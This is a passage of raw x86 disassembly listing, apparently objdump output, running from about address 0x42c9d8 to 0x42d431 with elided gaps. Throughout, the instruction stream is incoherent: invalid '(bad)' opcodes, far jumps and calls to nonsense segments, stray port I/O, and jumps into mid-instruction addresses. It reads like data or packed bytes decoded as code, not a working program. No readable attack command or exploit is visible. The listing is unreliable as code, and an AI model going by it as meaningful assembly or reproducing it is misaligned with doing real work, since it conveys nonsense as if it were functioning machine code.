  42c9d8:	mov    ds:0xf74bd7f8,al
  42c9dd:	sub    BYTE PTR [esi],ah
  42c9df:	enter  0xfaf6,0xa6
  42c9e3:	sahf   
  42c9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9e5:	cmp    ecx,DWORD PTR [ecx+0x6e528a81]
  42c9eb:	sub    eax,0xbfe32805
  42c9f0:	shl    ah,cl
  42c9f2:	and    eax,0x51267fcf
  42c9f7:	xor    esi,DWORD PTR [ecx+0x791cd7cf]
  42c9fd:	xchg   BYTE PTR [ecx+eiz*1+0x29878e55],bl
  42ca04:	fwait
  42ca05:	adc    al,0xf8
  42ca07:	nop
  42ca08:	jns    0x42c9e0
  42ca0a:	push   ecx
  42ca0b:	or     al,0xa4
  42ca0d:	mov    eax,0x23de07d6
  42ca12:	lods   eax,DWORD PTR ds:[esi]
  42ca13:	(bad)  
  42ca14:	in     eax,dx
  42ca15:	jg     0x42c99e
  42ca17:	pop    eax
  42ca18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca19:	test   eax,0xadbfd291
  42ca1e:	dec    ebp
  42ca1f:	inc    esi
  42ca20:	lds    esp,FWORD PTR [ebx+0x5bcb3046]
  42ca26:	adc    esp,ecx
  42ca28:	in     al,0x3d
  42ca2a:	mov    BYTE PTR [ebp-0x65b7c445],0x8f
  42ca31:	xchg   ebp,eax
  42ca32:	mov    eax,ds:0x6b3eaf7a
  42ca37:	lds    esp,FWORD PTR [edx-0x65361761]
  42ca3d:	in     eax,dx
  42ca3e:	xor    dl,BYTE PTR [ebx-0x67a0ba4c]
  42ca44:	js     0x42cab1
  42ca46:	call   0x867a:0x1cc61623
  42ca4d:	gs fs aaa 
  42ca50:	push   0xffffffdb
  42ca52:	dec    eax
  42ca53:	or     dl,ah
  42ca55:	ficom  DWORD PTR [ebx+0x6102e10c]
  42ca5b:	fist   WORD PTR [ebx+0x393b05a6]
  42ca61:	scas   eax,DWORD PTR es:[edi]
  42ca62:	pop    ds
  42ca63:	and    DWORD PTR [esi-0x2d],edi
  42ca66:	sahf   
  42ca67:	test   al,0x3a
  42ca69:	add    BYTE PTR [esi-0x1f],0x10
  42ca6d:	jbe    0x42ca1a
  42ca6f:	inc    esp
  42ca70:	into   
  42ca71:	cmp    DWORD PTR [ebx+edi*1+0x7ee18f7a],esi
  42ca78:	mov    ecx,0x2425a982
  42ca7d:	dec    ecx
  42ca7e:	mov    dl,0xf0
  42ca80:	je     0x42cac3
  42ca82:	xchg   ecx,eax
  42ca83:	push   ds
  42ca84:	loop   0x42cafb
  42ca86:	add    bh,BYTE PTR [edi]
  42ca88:	push   esp
  42ca89:	mov    bh,BYTE PTR [ebx]
  42ca8b:	cmp    DWORD PTR [esi+0x61227eb2],0x26
  42ca92:	jl     0x42caf2
  42ca94:	shr    ecx,cl
  42ca96:	in     eax,dx
  42ca97:	into   
  42ca98:	dec    edi
  42ca99:	jmp    0x674e:0x2e2c3d85
  42caa0:	mov    edi,0xb4c8cf2d
  42caa5:	push   ebx
  42caa6:	lock jg 0x42ca8f
  42caa9:	cmp    dl,BYTE PTR [ecx]
  42caab:	pop    esp
  42caac:	mov    esp,0xf98aea3d
  42cab1:	pop    edi
  42cab2:	xor    ecx,DWORD PTR ds:0xfc00d0b7
  42cab8:	jno    0x42cabe
  42caba:	jle    0x42cacd
  42cabc:	daa    
  42cabd:	pusha  
  42cabe:	jno    0x42ca9b
  42cac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cac1:	mov    edi,0x0
	...
  42cb32:	add    BYTE PTR [eax],al
  42cb34:	xor    al,0x28
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	jno    0x42caf5
  42cb42:	xlat   BYTE PTR ds:[ebx]
  42cb43:	pop    ds
  42cb44:	mov    al,ds:0xf60001d9
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    ah,dl
  42cb4d:	add    DWORD PTR [edx+0x7bd0de39],ebx
  42cb53:	mov    edx,0x55c6abd9
  42cb58:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb5a:	jmp    0x42cb2a
  42cb5c:	sub    BYTE PTR [ebp+0x2c],ah
  42cb5f:	and    ebx,ecx
  42cb61:	adc    al,BYTE PTR [ebp+0x9438328]
  42cb67:	jp     0x42caf0
  42cb69:	not    BYTE PTR [edi]
  42cb6b:	cmp    BYTE PTR [ebx+0x3cb3eb1c],cl
  42cb71:	enter  0x21ab,0x51
  42cb75:	cmpxchg BYTE PTR [eax+0x2e],bh
  42cb79:	inc    ebx
  42cb7a:	mov    DWORD PTR [esp+eax*2+0x38496c7e],0x140941e4
  42cb85:	mov    esp,DWORD PTR [esi-0x7]
  42cb88:	je     0x42cba8
  42cb8a:	pusha  
  42cb8b:	loop   0x42cbcf
  42cb8d:	xchg   DWORD PTR [esi-0x34],ebx
  42cb90:	push   es
  42cb91:	jae    0x42cba0
  42cb93:	mov    ds:0xff5f697f,eax
  42cb98:	jl     0x42cb65
  42cb9a:	jg     0x42cb85
  42cb9c:	push   eax
  42cb9d:	js     0x42cbfa
  42cb9f:	fwait
  42cba0:	lea    edi,[ebp+0x265b7758]
  42cba6:	imul   esi
  42cba8:	and    DWORD PTR [ebx+ebx*4-0x1043c6],0xb96c0a50
  42cbb3:	jl     0x42cc23
  42cbb5:	test   eax,0xc55aa81
  42cbba:	fsubr  QWORD PTR [esi-0x6b66eecb]
  42cbc0:	int3   
  42cbc1:	pop    ebp
  42cbc2:	clc    
  42cbc3:	and    edx,edi
  42cbc5:	call   0xec93b85a
  42cbca:	or     cl,BYTE PTR [esi]
  42cbcc:	loope  0x42cb79
  42cbce:	pusha  
  42cbcf:	imul   edi,edi,0xbdd12c67
  42cbd5:	or     eax,0xb3b1fc54
  42cbda:	dec    ecx
  42cbdb:	jge    0x42cc5a
  42cbdd:	jnp    0x42cbad
  42cbdf:	jge    0x42cb62
  42cbe1:	(bad)  
  42cbe2:	xchg   ebx,eax
  42cbe3:	push   edi
  42cbe4:	push   ebp
  42cbe5:	push   es
  42cbe6:	inc    ecx
  42cbe7:	icebp  
  42cbe8:	mov    ebp,0x82733adb
  42cbed:	test   eax,0x3f1fb937
  42cbf2:	sti    
  42cbf3:	retf   0x8a6a
  42cbf6:	xchg   ebx,eax
  42cbf7:	adc    dl,BYTE PTR [esi+eax*8]
  42cbfa:	in     al,dx
  42cbfb:	pop    esi
  42cbfc:	test   eax,0xf200ef01
  42cc01:	and    eax,0xe39a0527
  42cc06:	add    BYTE PTR [ecx-0x79],dh
  42cc09:	mov    esi,0xa9866a22
  42cc0e:	(bad)  
  42cc0f:	in     eax,0x2
  42cc11:	xor    DWORD PTR [edx+esi*2],0x107d7026
  42cc18:	lock mov bh,0x1c
  42cc1b:	enter  0x32db,0x32
  42cc1f:	out    dx,eax
  42cc20:	out    dx,eax
  42cc21:	push   ss
  42cc22:	add    al,0x69
  42cc24:	xchg   ebp,eax
  42cc25:	mov    ecx,0x4a8c5b27
  42cc2a:	inc    edx
  42cc2b:	add    ebx,DWORD PTR es:[ebp+0x6a]
  42cc2f:	outs   dx,DWORD PTR ds:[esi]
  42cc30:	adc    BYTE PTR [ebx],0x9a
  42cc33:	push   DWORD PTR [ecx+0x29]
  42cc36:	sbb    eax,DWORD PTR [edx*8-0xd0024c0]
  42cc3d:	push   0xffffff94
  42cc3f:	or     dl,BYTE PTR fs:[ebp+0x0]
	...
  42ccb3:	add    BYTE PTR [eax-0x61eb634a],dh
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    ebp,DWORD PTR [edx+0x57]
  42ccc2:	pop    ebx
  42ccc3:	ins    BYTE PTR es:[edi],dx
  42ccc4:	xchg   esi,eax
  42ccc5:	fiadd  DWORD PTR [ecx]
  42ccc7:	add    dh,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [ebx],ch
  42cccd:	jge    0x42cc53
  42cccf:	sub    DWORD PTR [edi+0x24],ebp
  42ccd2:	mov    edx,0x61a30b15
  42ccd7:	fimul  DWORD PTR [ecx]
  42ccd9:	stos   BYTE PTR es:[edi],al
  42ccda:	aam    0xee
  42ccdc:	cs xchg ecx,eax
  42ccde:	pop    ss
  42ccdf:	jno    0x42cc65
  42cce1:	add    eax,DWORD PTR [eax+0x27b0c050]
  42cce7:	les    esi,FWORD PTR [edx]
  42cce9:	pop    edx
  42ccea:	ss out dx,al
  42ccec:	mov    eax,ds:0xb6b3fe30
  42ccf1:	add    dl,dl
  42ccf3:	(bad)
  42ccf7:	jne    0x42cca1
  42ccf9:	add    ch,al
  42ccfb:	cwde   
  42ccfc:	shl    BYTE PTR [eax-0x2f],cl
  42ccff:	test   BYTE PTR [esi+0x6],0xb7
  42cd03:	jmp    0x33b44055
  42cd08:	in     eax,dx
  42cd09:	out    0x6a,al
  42cd0b:	fld    TBYTE PTR fs:[eax]
  42cd0e:	mov    bl,0xf7
  42cd10:	add    ecx,DWORD PTR [edi-0x78]
  42cd13:	dec    ecx
  42cd14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd15:	sbb    bh,bh
  42cd17:	enter  0xa04,0xac
  42cd1b:	lahf   
  42cd1c:	cmp    eax,0xcf79b9e7
  42cd21:	repnz xchg esi,eax
  42cd23:	xchg   ebx,eax
  42cd24:	fwait
  42cd25:	pop    ecx
  42cd26:	xor    esp,ecx
  42cd28:	cmp    bh,al
  42cd2a:	pop    ebx
  42cd2b:	or     eax,0x371bb7fa
  42cd30:	pop    edx
  42cd31:	lods   al,BYTE PTR ds:[esi]
  42cd32:	jnp    0x42cd08
  42cd34:	push   ecx
  42cd35:	mov    ds:0x119f8de8,eax
  42cd3a:	out    dx,al
  42cd3b:	xchg   esi,eax
  42cd3c:	push   cs
  42cd3d:	inc    esi
  42cd3e:	ins    DWORD PTR es:[edi],dx
  42cd3f:	push   ss
  42cd40:	call   0x95b1:0x81de98a8
  42cd47:	das    
  42cd48:	or     esi,ebp
  42cd4a:	or     DWORD PTR [edi],ecx
  42cd4c:	cmp    DWORD PTR [esi-0x1ad42fc4],esi
  42cd52:	je     0x42cd49
  42cd54:	inc    ecx
  42cd55:	stc    
  42cd56:	xor    esi,DWORD PTR ds:0xdfd13886
  42cd5c:	jae    0x42cd9f
  42cd5e:	inc    esi
  42cd5f:	mov    edx,0xc9578115
  42cd64:	pushf  
  42cd65:	and    al,0x31
  42cd67:	daa    
  42cd68:	sub    BYTE PTR [edi+0x18],bh
  42cd6b:	aad    0x71
  42cd6d:	ret    
  42cd6e:	dec    edi
  42cd6f:	inc    esp
  42cd71:	mov    dl,0xf9
  42cd73:	dec    ecx
  42cd74:	sbb    esi,eax
  42cd76:	das    
  42cd77:	pop    ebp
  42cd78:	lea    edx,[edx+0x5b0f9f8]
  42cd7e:	xchg   ecx,eax
  42cd7f:	aas    
  42cd80:	and    BYTE PTR [esi],dh
  42cd82:	dec    esp
  42cd83:	imul   esp,DWORD PTR [ebx+ecx*4+0x366fc194],0x22
  42cd8b:	jp     0x42ce03
  42cd8d:	inc    esp
  42cd8e:	push   cs
  42cd8f:	push   cs
  42cd90:	push   eax
  42cd91:	mov    ah,BYTE PTR [eax]
  42cd93:	les    ecx,FWORD PTR [edx+0x19]
  42cd96:	jo     0x42cd95
  42cd98:	enter  0xf877,0x9b
  42cd9c:	test   BYTE PTR [esi+0x65],bl
  42cd9f:	call   0x69f9c254
  42cda4:	sbb    al,0x56
  42cda6:	mov    dl,0x85
  42cda8:	mov    ah,0xfc
  42cdaa:	je     0x42cd3e
  42cdac:	int    0x71
  42cdae:	push   cs
  42cdaf:	sub    eax,0x443d0140
  42cdb4:	push   ebp
  42cdb5:	pop    esi
  42cdb6:	dec    esi
  42cdb7:	jmp    0x42ce35
  42cdb9:	adc    al,BYTE PTR [ecx+0x419a9a5f]
  42cdbf:	rdpmc  
  42cdc1:	jl     0x42cdc3
	...
  42ce33:	add    BYTE PTR [edi-0x825b8e0],dl
  42ce39:	call   FWORD PTR [edi+0x410aba6d]
  42ce3f:	sbb    DWORD PTR [ecx-0x73fa13be],edx
  42ce45:	fild   DWORD PTR [ecx]
  42ce47:	add    dh,dh
  42ce49:	add    BYTE PTR [eax],al
  42ce4b:	add    BYTE PTR [esi-0x42],al
  42ce4e:	adc    ch,BYTE PTR [esp+esi*4+0x5d]
  42ce52:	sub    eax,0x6f1092e6
  42ce57:	inc    edx
  42ce58:	dec    esp
  42ce59:	sahf   
  42ce5a:	mov    ecx,0xb1c9bdcb
  42ce5f:	imul   ebx,DWORD PTR ds:0xcc771f19,0xffffffe0
  42ce66:	xor    ah,BYTE PTR [eax]
  42ce68:	pushf  
  42ce69:	(bad)  [edx]
  42ce6b:	nop
  42ce6c:	xchg   edi,eax
  42ce6d:	fcmovu st,st(0)
  42ce6f:	sub    al,0x3f
  42ce71:	jge    0x42ce06
  42ce73:	fst    QWORD PTR [ebx]
  42ce75:	cmc    
  42ce76:	lods   al,BYTE PTR ds:[esi]
  42ce77:	fwait
  42ce78:	ret    
  42ce79:	retf   0x6e04
  42ce7c:	lea    ecx,[ebx-0x2e]
  42ce7f:	nop
  42ce80:	mov    ch,0x95
  42ce82:	stos   BYTE PTR es:[edi],al
  42ce83:	aas    
  42ce84:	in     al,0xd2
  42ce86:	cmp    eax,0x9f2b63aa
  42ce8b:	fisttp DWORD PTR ds:0x6032d311
  42ce91:	pop    ss
  42ce92:	aaa    
  42ce93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce95:	cmc    
  42ce96:	and    eax,0x12a59437
  42ce9b:	and    eax,DWORD PTR [edi]
  42ce9d:	fs daa 
  42ce9f:	retf   0xa5ad
  42cea2:	cmp    DWORD PTR [ecx],esp
  42cea4:	sti    
  42cea5:	xor    DWORD PTR [edi],edx
  42cea7:	jmp    0x42cf20
  42cea9:	push   ecx
  42ceaa:	push   ds
  42ceab:	(bad)  
  42ceac:	mov    eax,ds:0x9c80940d
  42ceb1:	dec    eax
  42ceb2:	mov    al,ds:0x9028b61b
  42ceb7:	lods   al,BYTE PTR ds:[esi]
  42ceb8:	adc    BYTE PTR [esi],cl
  42ceba:	xor    eax,ebp
  42cebc:	or     dl,dh
  42cebe:	retf   
  42cebf:	cmp    DWORD PTR [ebx+0x4d32c4ae],0xd
  42cec6:	lea    ebx,[ebx+0x3a]
  42cec9:	push   ebp
  42ceca:	sub    eax,0xacb3c084
  42cecf:	or     BYTE PTR [ecx+0x4aa62f0f],cl
  42ced5:	(bad)  
  42ced6:	adc    BYTE PTR [ecx],al
  42ced8:	mov    eax,ds:0x9158f145
  42cedd:	icebp  
  42cede:	aam    0xff
  42cee0:	add    ch,BYTE PTR [ebp-0x80]
  42cee3:	mov    edx,0xba0a97ab
  42cee8:	rcl    ch,0xa
  42ceeb:	add    eax,0x3e52326c
  42cef0:	jge    0x42cef4
  42cef2:	cld    
  42cef3:	jne    0x42ce7f
  42cef5:	xor    esp,0xffffffab
  42cef8:	in     al,dx
  42cef9:	retf   
  42cefa:	push   esi
  42cefb:	sbb    eax,edx
  42cefd:	or     al,0xf
  42ceff:	push   cs
  42cf00:	push   edx
  42cf01:	pushfw 
  42cf03:	test   eax,0x6e9951c0
  42cf08:	push   ss
  42cf09:	dec    esp
  42cf0a:	and    eax,ebx
  42cf0c:	pop    eax
  42cf0d:	dec    edx
  42cf0e:	dec    esp
  42cf0f:	int3   
  42cf10:	push   edx
  42cf11:	scas   al,BYTE PTR es:[edi]
  42cf12:	pop    eax
  42cf13:	xchg   DWORD PTR [edx],ebx
  42cf15:	(bad)  
  42cf16:	xchg   esi,eax
  42cf17:	out    dx,eax
  42cf18:	mov    al,ds:0xafbe2890
  42cf1d:	add    eax,0xba5e2402
  42cf22:	jge    0x42cf3b
  42cf24:	lahf   
  42cf25:	cdq    
  42cf26:	repz adc dl,dl
  42cf29:	ins    BYTE PTR es:[edi],dx
  42cf2a:	nop
  42cf2b:	add    bl,dl
  42cf2d:	add    BYTE PTR [edi-0x10],cl
  42cf30:	imul   BYTE PTR [ecx+0x62]
  42cf33:	add    al,0xfb
  42cf35:	add    ebx,0x6c9be4b2
  42cf3b:	out    0xfd,al
  42cf3d:	fiadd  DWORD PTR [ecx+0x3aa98]
	...
  42cfb3:	add    BYTE PTR [edx],bh
  42cfb5:	xchg   edx,eax
  42cfb6:	ja     0x42cfea
  42cfb8:	push   edi
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x45
  42cfc1:	stos   DWORD PTR es:[edi],eax
  42cfc2:	cmp    DWORD PTR [eax],eax
  42cfc4:	sbb    ah,0x1
  42cfc7:	add    dh,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [edi-0x2737a28c],ch
  42cfd1:	sub    DWORD PTR [ecx-0x45bb7ee2],esi
  42cfd7:	(bad)  
  42cfd8:	jmp    0xcf49:0xa2d492e0
  42cfdf:	sar    BYTE PTR ds:0xbf8f248f,0xef
  42cfe6:	lea    ecx,[edx+0x57fdf6ec]
  42cfec:	push   eax
  42cfed:	xlat   BYTE PTR ds:[ebx]
  42cfee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfef:	int3   
  42cff0:	aas    
  42cff1:	jns    0x42d039
  42cff3:	and    DWORD PTR [ebx-0x5547b61a],esi
  42cff9:	in     al,0x69
  42cffb:	sbb    al,0xc
  42cffd:	push   esp
  42cffe:	cmp    esi,edi
  42d000:	jle    0x42cfe0
  42d002:	jb     0x42cff2
  42d004:	jl     0x42d033
  42d006:	das    
  42d007:	ds aaa 
  42d009:	sub    DWORD PTR [ebx+0x68c7122d],edx
  42d00f:	test   eax,0xc7310feb
  42d014:	jbe    0x42cfac
  42d016:	pop    esi
  42d017:	or     al,0x7c
  42d019:	pop    eax
  42d01a:	adc    edx,esp
  42d01c:	fimul  DWORD PTR [ecx]
  42d01e:	popa   
  42d01f:	mov    ds:0xb737a7aa,al
  42d024:	xchg   ebx,eax
  42d025:	into   
  42d026:	outs   dx,DWORD PTR ds:[esi]
  42d027:	shl    BYTE PTR [ecx+0x57],1
  42d02a:	popf   
  42d02b:	and    al,0xe5
  42d02d:	add    BYTE PTR [ecx+0x13c9c490],ah
  42d033:	jbe    0x42d09e
  42d035:	addr16 dec eax
  42d037:	lods   eax,DWORD PTR ds:[esi]
  42d038:	xchg   edx,eax
  42d039:	mul    DWORD PTR [ecx]
  42d03b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d03d:	(bad)  
  42d03e:	nop
  42d03f:	loopne 0x42cfd0
  42d041:	call   0x1174:0x61c2b7a9
  42d048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d049:	pop    esi
  42d04a:	lods   al,BYTE PTR ds:[esi]
  42d04b:	pop    ds
  42d04c:	push   ebx
  42d04d:	ror    BYTE PTR [ebx],1
  42d04f:	mov    ?,esi
  42d051:	fisub  WORD PTR ds:0x85529b3a
  42d057:	(bad)  
  42d058:	ins    DWORD PTR es:[edi],dx
  42d059:	push   ebx
  42d05a:	dec    ebx
  42d05b:	sbb    eax,0x23a45ac7
  42d060:	pop    ebp
  42d061:	ds leave 
  42d063:	cwde   
  42d064:	pop    ebp
  42d065:	(bad)  
  42d066:	sub    cl,ch
  42d068:	vorps  xmm3,xmm6,XMMWORD PTR [eax+0x462270ab]
  42d070:	(bad)  
  42d071:	mov    esp,0x5c073b27
  42d076:	cmp    eax,0xe016598d
  42d07b:	fadd   DWORD PTR ds:0x644d2f47
  42d081:	je     0x42d0f1
  42d083:	cdq    
  42d084:	cmp    eax,0x2e2b32be
  42d089:	dec    ebx
  42d08a:	mov    bl,0x50
  42d08c:	stos   BYTE PTR es:[edi],al
  42d08d:	in     eax,dx
  42d08e:	jl     0x42d045
  42d090:	mov    WORD PTR [edx],es
  42d092:	mov    ds:0xc29c4144,eax
  42d097:	xchg   ebp,eax
  42d098:	pop    edx
  42d099:	outs   dx,BYTE PTR ds:[esi]
  42d09a:	pop    es
  42d09b:	jbe    0x42d0f0
  42d09d:	xor    ecx,DWORD PTR [eax-0x9]
  42d0a0:	sub    al,0x46
  42d0a2:	mov    dl,0xf4
  42d0a4:	pop    ecx
  42d0a5:	mov    dl,0x8
  42d0a7:	mov    eax,ds:0xe8a8d868
  42d0ac:	mov    cl,0x56
  42d0ae:	rol    BYTE PTR [edi+0x3ec992fd],cl
  42d0b4:	pop    esp
  42d0b5:	push   es
  42d0b6:	mov    cl,0xd7
  42d0b8:	or     eax,0xa50115b4
  42d0bd:	push   ecx
  42d0be:	aad    0xf5
  42d0c0:	xchg   edi,eax
  42d0c1:	and    BYTE PTR [eax],al
	...
  42d133:	add    BYTE PTR [ecx-0x7e],ch
  42d136:	int    0xae
  42d138:	out    dx,eax
  42d139:	out    dx,eax
  42d13a:	imul   eax,edi,0x41
  42d13d:	cdq    
  42d13e:	xor    eax,0x7c14a150
  42d143:	gs js  0x42d123
  42d146:	add    DWORD PTR [eax],eax
  42d148:	test   BYTE PTR [eax],0x0
  42d14b:	add    BYTE PTR [ebx+0x36],cl
  42d14e:	(bad)  
  42d14f:	cmp    ch,BYTE PTR ds:0xe406d1bc
  42d155:	mov    cl,0xa
  42d157:	into   
  42d158:	jbe    0x42d0e5
  42d15a:	in     al,dx
  42d15b:	push   edx
  42d15c:	jne    0x42d195
  42d15e:	mov    edx,0x92f2b1a5
  42d163:	out    0xf3,eax
  42d165:	mov    WORD PTR [edi+0x5190f711],cs
  42d16b:	inc    edi
  42d16c:	mov    es,WORD PTR [edx+0x75b0f555]
  42d172:	xchg   edx,eax
  42d173:	call   FWORD PTR [edi+0x3a771ffc]
  42d179:	or     dl,cl
  42d17b:	jo     0x42d18e
  42d17d:	fild   WORD PTR [ebp+0x44]
  42d180:	cdq    
  42d181:	jbe    0x42d16a
  42d183:	test   edx,edx
  42d185:	cmp    esi,DWORD PTR ds:0x605b7617
  42d18b:	adc    BYTE PTR [eax],ah
  42d18d:	cmp    DWORD PTR [edx+0x3c11f13d],esp
  42d193:	inc    ecx
  42d194:	mov    bh,0x8f
  42d196:	or     ch,bh
  42d198:	mov    eax,ds:0x2af3fc1a
  42d19d:	push   eax
  42d19e:	(bad)  
  42d19f:	icebp  
  42d1a0:	(bad)  
  42d1a1:	int3   
  42d1a2:	call   eax
  42d1a4:	test   eax,0xbfa83d90
  42d1a9:	pop    ecx
  42d1aa:	add    edi,DWORD PTR [edi+0x4e]
  42d1ad:	test   ch,cl
  42d1af:	jl     0x42d151
  42d1b1:	mov    ecx,DWORD PTR [esi+0x34]
  42d1b4:	inc    ecx
  42d1b5:	inc    edi
  42d1b6:	pop    ss
  42d1b7:	adc    al,0x84
  42d1b9:	pusha  
  42d1ba:	test   DWORD PTR [esi+0x2e],ebx
  42d1bd:	adc    eax,0x6c09af75
  42d1c2:	sub    eax,0xc0a630c9
  42d1c7:	jmp    0x43e6:0x2b32636c
  42d1ce:	lds    ebp,FWORD PTR [edx+eax*1-0x5c]
  42d1d2:	sar    bh,0xf7
  42d1d5:	cld    
  42d1d6:	jmp    0x42d16d
  42d1d8:	jo     0x42d210
  42d1da:	cmp    esp,ecx
  42d1dc:	pop    ds
  42d1dd:	stos   DWORD PTR es:[edi],eax
  42d1de:	push   edi
  42d1df:	xchg   edi,eax
  42d1e0:	jnp    0x42d257
  42d1e2:	and    al,0xb4
  42d1e4:	fwait
  42d1e5:	test   BYTE PTR [esi],bh
  42d1e7:	sbb    eax,0x683f64cf
  42d1ec:	and    dh,BYTE PTR [ebx]
  42d1ee:	jle    0x42d1f1
  42d1f0:	push   ecx
  42d1f1:	xor    al,0x9
  42d1f3:	cmp    DWORD PTR [ecx+eiz*2-0x6b33593d],ecx
  42d1fa:	cmp    DWORD PTR [eax],0xcaa975a8
  42d200:	fstp   DWORD PTR [eax]
  42d202:	push   es
  42d203:	lahf   
  42d204:	mov    ah,0xf3
  42d206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d208:	adc    al,0x23
  42d20a:	imul   edx,DWORD PTR [edi-0x32],0xcce2ac8d
  42d211:	les    ecx,FWORD PTR [edi+0x39323fb2]
  42d217:	cmp    ecx,ecx
  42d219:	dec    ebx
  42d21a:	pop    ebp
  42d21b:	cmp    eax,0xfcebf17b
  42d220:	and    eax,0x3efe15d9
  42d225:	mov    ah,0x40
  42d227:	mov    edx,0xd8d94c3a
  42d22c:	dec    ecx
  42d22d:	iret   
  42d22e:	mov    DWORD PTR [edi+0x1b],esi
  42d231:	daa    
  42d232:	push   esp
  42d233:	or     ch,dh
  42d235:	push   esi
  42d236:	push   esp
  42d237:	loopne 0x42d1f2
  42d239:	repz popa 
  42d23b:	retf   0x8b90
  42d23e:	aad    0xe1
  42d240:	mov    eax,0x1
	...
  42d2b1:	add    BYTE PTR [eax],al
  42d2b3:	add    dh,ah
  42d2b5:	psubusw mm5,QWORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	ins    DWORD PTR es:[edi],dx
  42d2c1:	imul   esp,DWORD PTR [ebx-0x27],0x6e
  42d2c5:	fiadd  WORD PTR [ecx]
  42d2c7:	add    dh,dh
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [ebp+0x7867d54c],bl
  42d2d1:	jne    0x42d2b9
  42d2d3:	push   ss
  42d2d4:	(bad)  
  42d2d6:	(bad)  
  42d2d7:	in     eax,0x84
  42d2d9:	xchg   BYTE PTR [edx+esi*1],dh
  42d2dc:	push   ecx
  42d2dd:	scas   al,BYTE PTR es:[edi]
  42d2de:	mov    esp,0x80e9371a
  42d2e3:	mov    al,ds:0x95b962c7
  42d2e8:	fwait
  42d2e9:	push   ds
  42d2ea:	mov    cl,0xb9
  42d2ec:	aad    0x1
  42d2ee:	mov    dh,0x70
  42d2f0:	int    0xe
  42d2f2:	leave  
  42d2f3:	(bad)  
  42d2f4:	jle    0x42d327
  42d2f6:	or     ebx,0xffffffd3
  42d2f9:	mov    esi,ebp
  42d2fb:	popa   
  42d2fc:	mov    ah,0xb7
  42d2fe:	fcmovnbe st,st(2)
  42d300:	xchg   esi,eax
  42d301:	sub    al,0x5f
  42d303:	popf   
  42d304:	not    BYTE PTR [ebp+0x2eccd7fd]
  42d30a:	(bad)  
  42d30c:	repnz pop ss
  42d30e:	dec    esi
  42d30f:	in     al,dx
  42d310:	add    cl,0x2c
  42d313:	pop    edi
  42d314:	and    esi,DWORD PTR [ecx]
  42d316:	out    0x56,al
  42d318:	fnstenv [ecx-0x7c]
  42d31b:	(bad)  
  42d31c:	lock cmp eax,0x9642d2f6
  42d322:	add    al,0x8e
  42d324:	das    
  42d325:	test   eax,0x709ece6
  42d32a:	nop    DWORD PTR [edi+edi*2]
  42d32e:	or     DWORD PTR [ebp-0x2a74ecb3],eax
  42d334:	in     eax,dx
  42d335:	loope  0x42d305
  42d337:	pop    ds
  42d338:	repz loop 0x42d345
  42d33b:	dec    esp
  42d33c:	fs push ecx
  42d33e:	xchg   esi,eax
  42d33f:	add    dl,bh
  42d341:	push   eax
  42d342:	fmul   st,st(2)
  42d344:	mov    al,0x1a
  42d346:	sub    esp,ecx
  42d348:	stos   DWORD PTR es:[edi],eax
  42d349:	shl    BYTE PTR [esi],cl
  42d34b:	daa    
  42d34c:	shl    DWORD PTR [ecx-0x38],1
  42d34f:	shr    BYTE PTR [ebp+0x7b],0x76
  42d353:	fwait
  42d354:	aad    0x91
  42d356:	add    eax,0x271e2946
  42d35b:	daa    
  42d35c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d35d:	dec    eax
  42d35e:	mov    esp,0xaee96a2b
  42d363:	pop    edi
  42d364:	and    al,0xcc
  42d366:	push   esi
  42d367:	dec    edx
  42d368:	or     bl,BYTE PTR [edx+0x6cb87e9c]
  42d36e:	pop    ds
  42d36f:	push   esi
  42d370:	retf   0x93bd
  42d373:	cmc    
  42d374:	ss ins BYTE PTR es:[edi],dx
  42d376:	push   ebp
  42d377:	sbb    eax,0x5938b3c1
  42d37c:	xchg   edi,eax
  42d37d:	(bad)  
  42d37e:	mov    WORD PTR [esi-0x166336a2],cs
  42d384:	fsub   DWORD PTR [edi+0x6e]
  42d387:	fistp  QWORD PTR [ecx-0x74]
  42d38a:	imul   ecx,DWORD PTR [edi],0xffffff80
  42d38d:	xor    DWORD PTR [ebx-0xd7fef86],edi
  42d393:	pop    ebp
  42d394:	push   ebp
  42d395:	nop
  42d396:	fld    QWORD PTR [eax]
  42d398:	enter  0xf0ea,0x8c
  42d39c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d39d:	pop    DWORD PTR [ecx]
  42d39f:	and    eax,0x32cd49d3
  42d3a4:	jge    0x42d37e
  42d3a6:	sub    BYTE PTR [eax+ecx*2],bl
  42d3a9:	jg     0x42d34a
  42d3ab:	cwde   
  42d3ac:	std    
  42d3ad:	mov    al,ds:0xaba7f56
  42d3b2:	push   0x4eaa986b
  42d3b7:	sbb    BYTE PTR [ebp+0x25],0xda
  42d3bb:	jp     0x42d37a
  42d3bd:	push   edx
  42d3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3bf:	push   ebx
  42d3c0:	mov    eax,ds:0x9e
	...
  42d431:	add    BYTE PTR [eax],al
